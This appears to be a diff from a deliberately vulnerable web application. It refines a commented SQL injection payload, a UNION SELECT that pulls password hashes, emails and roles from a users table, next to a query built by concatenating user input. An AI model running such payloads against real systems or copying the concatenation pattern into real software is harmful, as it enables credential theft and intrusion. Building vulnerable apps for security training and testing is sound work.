@@ -150,7 +150,7 @@ def search_claims():
             # User input is directly concatenated into the SQL query
             # A staff user can inject SQL to extract other users' claims or credentials
             # Example injection payload (staff user):
-            #   x' UNION SELECT id::text, username, email, password_hash, role, NULL::text, NULL::text, NULL::text, NULL::text, NULL::text, NULL::text, NULL::text FROM users -- 
+            #   x' UNION SELECT id::int, 0::int, 0::int, password_hash, email, 0.0, role, created_at, NULL::timestamp, NULL::timestamp, NULL::int, NULL FROM users -- 
             if current_user.is_oic():
                 raw_query = "SELECT * FROM claims WHERE title LIKE '%" + search_query + "%' ORDER BY created_at DESC"
             else:
